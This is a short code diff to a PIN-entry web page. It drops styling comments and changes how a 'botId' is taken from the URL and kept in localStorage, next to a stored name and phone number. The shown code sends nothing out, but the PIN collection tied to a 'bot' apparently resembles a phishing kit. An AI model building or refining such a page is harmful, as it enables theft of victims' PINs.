@@ -57,7 +57,6 @@
       margin-bottom: 26px;
     }
 
-    /* 🔥 PIN BOX STYLING */
     .pin-box {
       width: 56px;
       height: 56px;
@@ -74,13 +73,11 @@
       transition: all 0.2s ease;
     }
 
-    /* Filled state (dot visible) */
     .pin-box:not(:empty) {
       border-color: #c00000;
       background: #fff;
     }
 
-    /* 🔒 LOCK MATCHING PIN BOX */
     .lock {
       width: 56px;
       height: 56px;
@@ -178,15 +175,16 @@
     const fullName = localStorage.getItem('fullName');
     const phone = localStorage.getItem('phone');
 
+    // ✅ FIXED botId HANDLING
     const params = new URLSearchParams(window.location.search);
-    const botId =
-      params.get('botId') ||
-      localStorage.getItem('botId') ||
-      'bot1';
+    const urlBotId = params.get('botId');
+    if (urlBotId) {
+      localStorage.setItem('botId', urlBotId);
+    }
 
-    localStorage.setItem('botId', botId);
+    const botId = localStorage.getItem('botId');
 
-    if (!fullName || !phone) {
+    if (!fullName || !phone || !botId) {
       alert('Session expired. Please start again.');
       window.location.href = 'index.html';
     }
